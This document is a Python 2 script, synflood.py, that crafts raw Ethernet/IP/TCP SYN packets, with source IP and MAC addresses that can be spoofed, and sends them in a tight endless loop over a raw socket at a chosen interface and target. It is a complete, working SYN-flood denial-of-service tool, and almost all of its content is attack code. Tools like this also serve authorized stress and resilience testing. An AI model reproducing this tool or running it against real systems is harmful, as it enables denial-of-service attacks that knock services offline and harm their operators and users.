#!/usr/bin/env python

import re
import sys
import time
import signal
import getopt
import psutil
import struct
import socket
import netifaces

from netifaces import AF_INET, AF_LINK

# CONFIGURATIONS
cpus      = [1]

APP_SOCKET = ''

#clean resources and exit on received signal
def signal_handler(signal, frame):

    global APP_SOCKET

    APP_SOCKET.close()
    sys.exit(0)

def usage():

    print("usage: python synflood.py [-i |-s |-d |-S |-D |-t |-m |-p |-P |-h]")
    print("Options and arguments:")
    print("-i     : interface to send from (also --interface) ; mandatory argument")
    print("-s     : source IP address (also --source-ip) ; default is interface's IP")
    print("-d     : destination IP address (also --destination-ip)")
    print("-S     : source MAC address (also --source-mac)")
    print("-D     : destination MAC address (also --destination-mac) ; default is interface's MAC")
    print("-t     : time between SYNs in milliseconds (also --interval) ; default=1")
    print("-m     : pause only for X microseconds instead of milliseconds (also --microseconds)")
    print("-p     : source port (also --source-port) ; default=1234")
    print("-P     : destination port (also --destination-port) ; default=80")
    print("-h     : print this help message and exit (also --help)")

def valid_ip(ip):

    try:
        socket.inet_aton(ip)
    except socket.error:
        return False
    return True

def valid_mac(mac):
    return re.match("[0-9a-f]{2}([:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac)

def tcp_checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w

    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff

    return s

def ip_checksum(source_string):
    """
    I'm not too confident that this is right but testing seems
    to suggest that it gives the same answers as in_cksum in ping.c
    """
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff # Necessary?
        count = count + 2
 
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff # Necessary?
 
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
 
    # Swap bytes. Bugger me if I know why.
    answer = answer >> 8 | (answer << 8 & 0xff00)
 
    return answer

def build_tcp_hdr(tcp_src_port, tcp_dst_port, src_ip, dst_ip):
    # Build TCP Header
    tcp_seq      = 0
    tcp_ack      = 0
    tcp_doff     = 5
    tcp_fin      = 0
    tcp_syn      = 1
    tcp_rst      = 0
    tcp_psh      = 0
    tcp_ack      = 0
    tcp_urg      = 0
    tcp_window   = socket.htons(5840) # maximum allowed window size
    tcp_check    = 0
    tcp_urg_ptr  = 0

    tcp_doff_res = (tcp_doff << 4) + 0
    tcp_flags    = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

    # create pseudo-header and calculate checksum
    tcp_ip_src_addr = socket.inet_aton(src_ip)
    tcp_ip_dst_addr = socket.inet_aton(dst_ip)
    tcp_protocol    = socket.IPPROTO_TCP
    tcp_length      = 20

    tcp_header = struct.pack('!HHLLBBHHH',
            tcp_src_port, tcp_dst_port,
            tcp_seq,
            tcp_ack,
            tcp_doff_res, tcp_flags, tcp_window,
            0, tcp_urg_ptr)
    tcp_pseudo = struct.pack('!4s4sBBH', tcp_ip_src_addr, tcp_ip_dst_addr, 0, tcp_protocol, tcp_length)
    tcp_chksum = tcp_checksum(tcp_pseudo + tcp_header)

    # Create final header with correct checksum
    tcp_header = struct.pack('!HHLLBBHHH',
            tcp_src_port, tcp_dst_port,
            tcp_seq,
            tcp_ack,
            tcp_doff_res, tcp_flags, tcp_window,
            tcp_chksum, tcp_urg_ptr)

    return tcp_header

def build_ip_hdr(src_ip, dst_ip, tcp_header):
    # Build IP Header
    ip_ihl         = 5
    ip_version     = 4
    ip_tos         = 0
    ip_tot_len     = 20 + len(tcp_header)
    ip_id          = 54321
    ip_frag_off    = 0
    ip_ttl         = 255
    ip_protocol    = socket.IPPROTO_TCP
    ip_src_addr    = socket.inet_aton(src_ip)
    ip_dst_addr    = socket.inet_aton(dst_ip)

    ip_ihl_version = (ip_version << 4) + ip_ihl

    # Calculate ip header checksum
    ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_version, ip_tos, ip_tot_len,
            ip_id, ip_frag_off,
            ip_ttl, ip_protocol, 0,
            ip_src_addr,
            ip_dst_addr)

    ip_chksum = ip_checksum(ip_header)

    # Create final header with correct checksum
    ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_version, ip_tos, ip_tot_len,
            ip_id, ip_frag_off,
            ip_ttl, ip_protocol, ip_chksum,
            ip_src_addr,
            ip_dst_addr)

    return ip_header

def build_eth_hdr(src_mac, dst_mac):
    # Build ETH Header
    eth_dst_addr = [ int(x, 16) for x in dst_mac.split(':') ]
    eth_src_addr = [ int(x, 16) for x in src_mac.split(':') ]
    eth_type     = 0x0800

    eth_header   = struct.pack('!BBBBBBBBBBBBH', *(eth_dst_addr + eth_src_addr + [eth_type]))

    return eth_header

def main(argv):

    global APP_SOCKET

    interface = ''
    src_ip    = ''
    dst_ip    = ''
    src_mac   = ''
    dst_mac   = ''
    src_port  = 1234
    dst_port  = 80

    interval = 0.001
    interval_in_micro = False

    has_interface = False

    has_src_ip = False
    has_dst_ip = False

    has_src_mac = False
    has_dst_mac = False

    has_src_port = False
    has_dst_port = False

    try:
        opts, args = getopt.getopt(argv, "hi:s:d:S:D:t:mp:P:", ["help", "interface=", "source-ip=",
                                                         "destination-ip=", "source-mac=",
                                                         "destination-mac=", "interval=",
                                                         "microseconds", "source-port=",
                                                         "destination-port="])

    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif opt in ("-i", "--interface"):
            has_interface = True
            interface = arg
        elif opt in ("-s", "--source-ip"):
            has_src_ip = True
            src_ip = arg
        elif opt in ("-d", "--destination-ip"):
            has_dst_ip = True
            dst_ip = arg
        elif opt in ("-S", "--source-mac"):
            has_src_mac = True
            src_mac = arg
        elif opt in ("-D", "--destination-mac"):
            has_dst_mac = True
            dst_mac = arg
        elif opt in ("-t", "--interval"):
            interval = float(arg)/1000
        elif opt in ("-m", "--microseconds"):
            interval_in_micro = True
        elif opt in ("-p", "--source-port"):
            src_port = int(arg)
        elif opt in ("-P", "--destination-port"):
            dst_port = int(arg)

    if not has_interface:
        print "Error: the interface must be specified\n"
        usage()
        sys.exit(-1)

    if interface not in netifaces.interfaces():
        print "Error: specified interface does not exist: " + interface + "\n"
        usage()
        sys.exit(-1)

    if (not has_dst_ip) or (not has_dst_mac):
        print "Error: both IP and MAC of the destination must be specified\n"
        usage()
        sys.exit(-1)

    #check if the specified dst_ip is really an IP address
    if not valid_ip(dst_ip):
        print "Error: destination IP address is not valid\n"
        sys.exit(-1)

    #check if the specified dst_mac is really a MAC address
    if not valid_mac(dst_mac):
        print "Error: destination MAC address is not valid\n"
        sys.exit(-1)

    if not has_src_ip:
        print "Info: No source IP specified. Using the interface's IP"
        src_ip = netifaces.ifaddresses(interface)[AF_INET][0]['addr']
    else:
        if not valid_ip(src_ip):
            print "Error: source IP address is not valid\n"
            sys.exit(-1)

    if not has_src_mac:
        print "Info: No source MAC specified. Using the interface's MAC"
        src_mac = netifaces.ifaddresses(interface)[AF_LINK][0]['addr']
    else:
        if not valid_mac(src_mac):
            print "Error: source MAC address is not valid\n"
            sys.exit(-1)

    if interval_in_micro:
        interval = interval/1000

    tcp_header = build_tcp_hdr(src_port, dst_port, src_ip, dst_ip)
    ip_header  = build_ip_hdr(src_ip, dst_ip, tcp_header)
    eth_header = build_eth_hdr(src_mac, dst_mac)


    # Build the complete packet
    packet = eth_header + ip_header + tcp_header

    # Create socket and send packets

    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit(-1)

    try:
        s.bind((interface, 0))
    except socket.error, msg:
        print 'Socket could not be bound. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit(-1)

    try:
        s.setblocking(0)
    except socket.error, msg:
        print 'Warning: socket could not be set to non-blocking. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]

    # set the global socket variable as the socket created and bound here
    APP_SOCKET = s

    # Pin to the right core
    psutil.Process().set_cpu_affinity(cpus)

    while True:
        try:
            s.send(packet)
            time.sleep(interval)
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    signal.signal(signal.SIGHUP , signal_handler)
    signal.signal(signal.SIGINT , signal_handler)
    signal.signal(signal.SIGQUIT, signal_handler)
    signal.signal(signal.SIGSEGV, signal_handler)
    signal.signal(signal.SIGPIPE, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    main(sys.argv[1:])
